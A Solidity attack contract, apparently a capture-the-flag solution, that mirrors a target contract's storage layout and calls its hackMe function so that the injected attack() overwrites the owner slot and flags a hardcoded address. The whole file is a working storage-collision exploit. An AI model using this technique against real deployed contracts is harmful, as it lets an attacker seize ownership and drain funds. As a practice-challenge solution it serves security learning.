//SPDX-License-Identifier:UNLICENSED
pragma solidity 0.8.7;

/**
 * @title attack contract for challenge 5
 * @author Purple_Calender
 * @custom:experimental this is an experimental contract
 */

/**
 * Objective of CTF
   * Become the owner of the contract.
   * Make canYouHackMe mapping to true for your own
address.
 */
contract Attack {
    uint a = 12345;
    uint8 b = 32;
    string private d; // Super Secret data.
    uint32 private c; // Super Secret data.
    string private mot; // Super Secret data.
    address public owner;
    mapping(address => bool) public canYouHackMe;
    address public attackAddr;

    constructor(address addr) {
        attackAddr = addr;
    }

    ///Funtion to call the hackMe function
    function attackHackMe() external returns (bool) {
        (bool success, ) = attackAddr.call(
            abi.encodeWithSignature(
                "hackMe(bytes)",
                abi.encodeWithSignature("attack()")
            )
        );
        require(success, "Hack me failed");
        return success;
    }

    ///function to attack
    function attack() external {
        owner = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;
        canYouHackMe[0xdD870fA1b7C4700F2BD7f44238821C26f7392148] = true;
    }
}
